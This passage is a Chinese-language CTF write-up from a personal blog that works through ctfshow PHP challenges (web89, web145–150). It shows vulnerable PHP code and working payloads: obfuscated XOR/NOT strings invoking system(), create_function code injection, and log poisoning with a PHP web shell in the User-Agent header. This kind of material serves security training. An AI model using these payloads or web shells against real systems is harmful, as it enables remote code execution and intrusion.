= (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return strlen($str)===1?true:false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>与前面几个题类似，将v1,v2,v3三个顺序重新调一下就好了</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web155\"><a href=\"#web155\" class=\"headerlink\" title=\"web155\"></a>web155</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看了yu22x师傅的wp，妙！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1?phpinfo():1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>这里考察了三目运算符，这里是可以执行phpinfo()的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8F%97%8F%96%91%99%90)():&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n<p>这样可以执行phpinfo()</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web146\"><a href=\"#web146\" class=\"headerlink\" title=\"web146\"></a>web146</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>过滤了冒号，无法使用三目运算符，但是可以使用等号和位运算符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1==phpinfo()||1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>这里可以执行phpinfo()</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%14%01%03%20%06%02&#x27;|&#x27;%60%60%60%20%60%28&#x27;)|&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web147\"><a href=\"#web147\" class=\"headerlink\" title=\"web147\"></a>web147</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class=\"line\">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class=\"line\">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不会，还是老老实实看wp吧。</p>\n<p>考察点：create_function()代码注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">类似于</span><br><span class=\"line\"></span><br><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo $a.&quot;123&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>那么如果我们第二个参数传入 echo 1;}phpinfo();&#x2F;&#x2F;<br> 就等价于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo 1;&#125;phpinfo();//</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">从而执行phpinfo()命令</span><br><span class=\"line\">fuzz后发现%5c可以绕过这个正则表达式</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: ?show=echo 123;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class=\"line\">post: ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web148\"><a href=\"#web148\" class=\"headerlink\" title=\"web148\"></a>web148</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $code=$_GET[&#x27;code&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123;</span><br><span class=\"line\">        die(&quot;error&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @eval($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function get_ctfshow_fl0g()&#123;</span><br><span class=\"line\">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>未过滤异或，直接构造</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web149\"><a href=\"#web149\" class=\"headerlink\" title=\"web149\"></a>web149</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>非预期</p>\n<p>往index.php直接写马，然后蚁剑连接即可</p>\n<p>预期解</p>\n<p>文件竞争，一个负责一直写文件，一个负责一直读文件</p>\n<h3 id=\"web150\"><a href=\"#web150\" class=\"headerlink\" title=\"web150\"></a>web150</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#过滤字符</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>日志绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /?isVIP=1 HTTP/1.1</span><br><span class=\"line\">Host: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show</span><br><span class=\"line\">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: _ga=GA1.2.1418869291.1680592508</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 49</span><br><span class=\"line\"></span><br><span class=\"line\">ctf=/var/log/nginx/access.log&amp;1=system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web150-plus\"><a href=\"#web150-plus\" class=\"headerlink\" title=\"web150_plus\"></a>web150_plus</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#过滤字符</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了log，不能日志包含绕过了</p>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个题一点点小坑__autoload()函数不是类里面的</span><br><span class=\"line\">__autoload — 尝试加载未定义的类</span><br><span class=\"line\">最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦</span><br><span class=\"line\">原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用</span><br><span class=\"line\">__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo</span><br><span class=\"line\">接下来就去getshell啦</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>php变量不能含有点空格，遇到这些会自动转化为下划线</p>\n<hr>\n<p>总算是写完啦，不过这永远不是终点…</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"PHP特性\"><a href=\"#PHP特性\" class=\"headerlink\" title=\"PHP特性\"></a>PHP特性</h1><p>php特性这个东西很杂，覆盖的内容也很多，都是一些零碎的知识点，这次正好借这个刷题的机会，做一个小复习</p>\n<h3 id=\"web89\"><a href=\"#web89\" class=\"headerlink\" title=\"web89\"></a>web89</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里<code>preg_match(&quot;/[0-9]/&quot;, $num</code>过滤了数字，但是</p>\n<p>我们要让<code>intval($num)</code>为真，这题考的就是<code>intval</code>的特性</p>\n<p><strong>intval()的测试</strong></p>\n<blockquote>\n<p>返回值<br>成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array<br>返回 1。 </p>\n</blockquote>\n<p>测试了一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">echo intval(1234);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(042);  //34  0开头的，当成了8进制</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(0x1a);  //26 0x开头，当成16进制</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(3e3);  //3000 科学计数法 3 X 10的三次方</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&#x27;3e3&#x27;);  //3000</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&quot;1234a&quot;);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(4.2); //转化为整数</span><br></pre></td></tr></table></figure>\n\n<p>回到题目</p>\n<p>可以用数组绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num[]=a</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web90\"><a href=\"#web90\" class=\"headerlink\" title=\"web90\"></a>web90</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 